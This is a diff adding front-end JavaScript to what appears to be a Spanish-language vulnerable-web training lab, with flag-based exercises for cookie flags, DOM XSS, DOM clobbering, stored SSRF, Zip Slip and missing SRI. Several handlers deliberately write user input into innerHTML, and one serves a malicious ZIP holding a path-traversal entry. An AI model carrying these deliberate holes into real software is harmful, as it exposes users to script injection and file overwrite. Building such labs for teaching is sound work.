+  setOut('cookie-out', 'Haciendo login...', '');
+  try {
+    const r = await fetch(API + '/api/cookie-login', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ username, password })
+    });
+    const setCookie = r.headers.get('set-cookie');
+    const d = await r.json();
+    setOut('cookie-out', `Set-Cookie: ${setCookie || '(no visible desde JS — usa DevTools Network tab)'}\n\nRespuesta:\n${JSON.stringify(d, null, 2)}\n\nNota: Sin HttpOnly → document.cookie daría acceso. Sin SameSite → CSRF posible.`, d.flag ? 'ok' : 'err');
+    if (d.flag) { $('flag-cookie').classList.add('show'); markSolved('cookie'); }
+  } catch(e) { setOut('cookie-out', 'Error: ' + e.message, 'err'); }
+}
+
+// ── DOM XSS ───────────────────────────────────
+function doDOMXSS() {
+  const payload = $('domxss-payload').value;
+  // Simular la lectura de location.hash y escritura con innerHTML
+  const renderEl = $('domxss-render');
+  renderEl.innerHTML = payload;  // VULNERABLE: innerHTML directamente
+  const hasPayload = /<[a-z]/i.test(payload);
+  setOut('domxss-out', `Payload escrito via innerHTML:\n${payload}\n\n${hasPayload ? 'DOM modificado — si hay event handlers (onerror, onclick...) se ejecutan.' : 'Sin tags HTML detectados.'}`, hasPayload ? 'ok' : '');
+  if (hasPayload) { $('flag-domxss').classList.add('show'); markSolved('domxss'); }
+}
+
+// ── DOM Clobbering ────────────────────────────
+function doDOMClob() {
+  const html = $('domclob-html').value;
+  const container = $('domclob-container');
+  const renderEl = $('domclob-render');
+  container.style.display = 'block';
+  renderEl.innerHTML = html;  // inyecta el HTML en el DOM
+  // Leer window.config — puede haber sido clobbered por el elemento inyectado
+  const configVal = window.config;
+  const isClobbered = configVal instanceof HTMLElement || (configVal && configVal.nodeType);
+  const configStr = isClobbered
+    ? `HTMLElement: <${configVal.tagName}> href="${configVal.href || configVal.getAttribute('href') || 'N/A'}"`
+    : String(configVal);
+  setOut('domclob-out', `window.config = ${configStr}\n\nTipo: ${typeof configVal} (${isClobbered ? 'DOM Element — clobbered!' : 'valor normal'})\n\n${isClobbered ? 'DOM Clobbering exitoso: el elemento HTML sobrescribió window.config' : 'No hay clobbering con este HTML'}`, isClobbered ? 'ok' : '');
+  if (isClobbered) { $('flag-domclob').classList.add('show'); markSolved('domclob'); }
+}
+
+// ── Stored SSRF ───────────────────────────────
+async function doSSRF2Save() {
+  const id = $('ssrf2-id').value;
+  const url = $('ssrf2-url').value;
+  setOut('ssrf2-save-out', 'Guardando webhook...', '');
+  try {
+    const r = await fetch(API + '/api/webhook/save', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ id, url })
+    });
+    const d = await r.json();
+    setOut('ssrf2-save-out', JSON.stringify(d, null, 2), d.saved ? 'ok' : 'err');
+  } catch(e) { setOut('ssrf2-save-out', 'Error: ' + e.message, 'err'); }
+}
+
+async function doSSRF2Trigger() {
+  const id = $('ssrf2-id').value;
+  setOut('ssrf2-out', 'Disparando webhook — servidor fetchará la URL...', '');
+  try {
+    const r = await fetch(API + '/api/webhook/trigger', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ id })
+    });
+    const d = await r.json();
+    setOut('ssrf2-out', JSON.stringify(d, null, 2), d.flag ? 'ok' : (d.error ? 'err' : ''));
+    if (d.flag) { $('flag-ssrf2').classList.add('show'); markSolved('ssrf2'); }
+  } catch(e) { setOut('ssrf2-out', 'Error: ' + e.message, 'err'); }
+}
+
+// ── Zip Slip ──────────────────────────────────
+function doZipDownload() {
+  setOut('zipslip-dl-out', 'Descargando ZIP malicioso...', '');
+  const a = document.createElement('a');
+  a.href = API + '/api/zipslip/malicious';
+  a.download = 'malicious.zip';
+  a.click();
+  setOut('zipslip-dl-out', 'ZIP descargado. Contiene:\n- normal.txt\n- ../../tmp/zipslip_pwned.txt (path traversal!)\n\nSúbelo en el Paso 2 para demostrar la extracción insegura.', 'ok');
+}
+
+async function doZipUpload() {
+  const fileInput = $('zipslip-file');
+  if (!fileInput.files.length) return setOut('zipslip-out', 'Selecciona un archivo ZIP primero', 'err');
+  const fd = new FormData();
+  fd.append('zipfile', fileInput.files[0]);
+  setOut('zipslip-out', 'Extrayendo ZIP...', '');
+  try {
+    const r = await fetch(API + '/api/unzip', { method: 'POST', body: fd });
+    const d = await r.json();
+    setOut('zipslip-out', JSON.stringify(d, null, 2), d.flag ? 'ok' : (d.error ? 'err' : ''));
+    if (d.flag) { $('flag-zipslip').classList.add('show'); markSolved('zipslip'); }
+  } catch(e) { setOut('zipslip-out', 'Error: ' + e.message, 'err'); }
+}
+
+// ── SRI Ausente ───────────────────────────────
+async function doSRICheck() {
+  setOut('sri-out', 'Verificando...', '');
+  try {
+    const r = await fetch(API + '/api/headers-check');
+    const d = await r.json();
+    const msg = `Cabeceras de seguridad en este lab:\n${JSON.stringify(d.missing, null, 2)}\n\nNota SRI: Este lab no usa librerías CDN externas, pero el concepto aplica a cualquier app que cargue scripts externos sin integrity hash.\n\nEjemplo de riesgo: Si jQuery en CDN fuera comprometido sin SRI, todos los usuarios ejecutarían código malicioso.`;
+    setOut('sri-out', msg, 'ok');
+    $('flag-sri').classList.add('show');
+    markSolved('sri');
+  } catch(e) { setOut('sri-out', 'Error: ' + e.message, 'err'); }
 }
 
 // ── Helpers ───────────────────────────────────
